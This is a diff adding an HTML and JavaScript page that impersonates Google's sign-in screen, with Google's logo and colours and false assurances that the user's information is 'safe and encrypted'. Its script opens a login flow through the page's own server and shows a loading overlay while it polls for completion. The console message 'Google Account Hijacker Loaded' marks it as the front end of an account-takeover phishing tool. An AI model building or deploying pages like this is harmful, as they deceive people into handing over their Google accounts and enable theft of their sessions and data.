@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .google-logo {
+            width: 72px;
+            height: 72px;
+            margin: 0 auto 30px;
+        }
+        .google-logo svg {
+            width: 100%;
+            height: 100%;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        .signin-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-decoration: none;
+            position: relative;
+            z-index: 2;
+        }
+        .signin-btn:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        .signin-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .signin-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: white;
+        }
+        .footer-text {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        /* ============================================ */
+        /* BLACK OVERLAY - LOADING */
+        /* ============================================ */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(4px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            animation: fadeIn 0.3s ease;
+        }
+        .overlay.active {
+            display: flex;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #4285F4;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 30px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .overlay-text {
+            color: white;
+            font-size: 18px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+        .overlay-sub {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+            margin-top: 8px;
+        }
+        .overlay-status {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 13px;
+            margin-top: 20px;
+            padding: 8px 16px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 90%;
+            text-align: center;
+        }
+        .overlay-close-btn {
+            margin-top: 30px;
+            padding: 10px 30px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.2s;
+            display: none;
+        }
+        .overlay-close-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        .overlay-close-btn.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================ -->
+    <!-- BLACK OVERLAY -->
+    <!-- ============================================ -->
+    <div class="overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="overlay-text">Authenticating with Google</div>
+        <div class="overlay-sub">Please wait while we secure your session...</div>
+        <div class="overlay-status" id="overlayStatus">⏳ Initiating secure connection...</div>
+        <button class="overlay-close-btn" id="overlayCloseBtn" onclick="closeOverlay()">✕ Close</button>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- MAIN CONTENT -->
+    <!-- ============================================ -->
+    <div class="container">
+        <div class="google-logo">
+            <svg viewBox="0 0 48 48">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+        </div>
+
+        <h1>Sign in to Google</h1>
+        <p class="subtitle">Securely access your Google account</p>
+
+        <button class="signin-btn" id="signinBtn">
+            <svg viewBox="0 0 24 24">
+                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#fff"/>
+                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#fff"/>
+                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.66-2.84z" fill="#fff"/>
+                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#fff"/>
+            </svg>
+            Sign in with Google
+        </button>
+
+        <div class="footer-text">
+            <p>This will open Google's secure login page.</p>
+            <p>Your information is safe and encrypted.</p>
+        </div>
+    </div>
+
+    <script>
+        // ================================================
+        // FRONTEND LOGIC
+        // ================================================
+
+        const signinBtn = document.getElementById('signinBtn');
+        const overlay = document.getElementById('loadingOverlay');
+        const overlayStatus = document.getElementById('overlayStatus');
+        const closeBtn = document.getElementById('overlayCloseBtn');
+
+        let statusInterval = null;
+
+        function updateStatus(message) {
+            overlayStatus.textContent = message;
+        }
+
+        function showOverlay() {
+            overlay.classList.add('active');
+            signinBtn.disabled = true;
+            closeBtn.classList.remove('show');
+        }
+
+        function hideOverlay() {
+            overlay.classList.remove('active');
+            signinBtn.disabled = false;
+            if (statusInterval) {
+                clearInterval(statusInterval);
+                statusInterval = null;
+            }
+        }
+
+        function closeOverlay() {
+            hideOverlay();
+            fetch('/auth/cancel', { method: 'POST' }).catch(() => {});
+        }
+
+        // ================================================
+        // HANDLE SIGN IN
+        // ================================================
+        signinBtn.addEventListener('click', async function() {
+            showOverlay();
+            updateStatus('⏳ Initiating secure connection...');
+
+            try {
+                const response = await fetch('/auth/google', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    updateStatus('📧 A new browser window has opened. Please log in to your Google account.');
+                    updateStatus('⏳ Waiting for authentication...');
+
+                    // Poll for status
+                    let checkCount = 0;
+                    const maxChecks = 120; // 10 minutes (5 second intervals)
+
+                    if (statusInterval) clearInterval(statusInterval);
+
+                    statusInterval = setInterval(async () => {
+                        checkCount++;
+                        try {
+                            const statusRes = await fetch('/auth/status');
+                            const statusData = await statusRes.json();
+
+                            console.log('Status:', statusData);
+
+                            // Check if complete
+                            if (statusData.complete === true) {
+                                clearInterval(statusInterval);
+                                statusInterval = null;
+                                updateStatus('✅ Authentication successful!');
+                                closeBtn.classList.add('show');
+                                setTimeout(() => {
+                                    hideOverlay();
+                                }, 3000);
+                                return;
+                            }
+
+                            // Check if failed
+                            if (statusData.status === 'failed') {
+                                clearInterval(statusInterval);
+                                statusInterval = null;
+                                updateStatus('❌ ' + statusData.message);
+                                closeBtn.classList.add('show');
+                                return;
+                            }
+
+                            // Update status message
+                            if (statusData.message) {
+                                updateStatus(statusData.message);
+                            }
+
+                        } catch (e) {
+                            console.log('Status check error:', e);
+                        }
+
+                        if (checkCount >= maxChecks) {
+                            clearInterval(statusInterval);
+                            statusInterval = null;
+                            updateStatus('⏱️ Authentication timeout. Please try again.');
+                            closeBtn.classList.add('show');
+                        }
+                    }, 5000);
+
+                } else {
+                    updateStatus('❌ Failed to start authentication. Please try again.');
+                    closeBtn.classList.add('show');
+                }
+
+            } catch (error) {
+                console.error('Error:', error);
+                updateStatus('❌ Connection error. Please try again.');
+                closeBtn.classList.add('show');
+            }
+        });
+
+        console.log('🔐 Google Account Hijacker Loaded');
+        console.log('📧 Click "Sign in with Google" to start');
+        console.log('💡 The overlay will stay until authentication completes or fails');
+    </script>
+</body>
+</html>
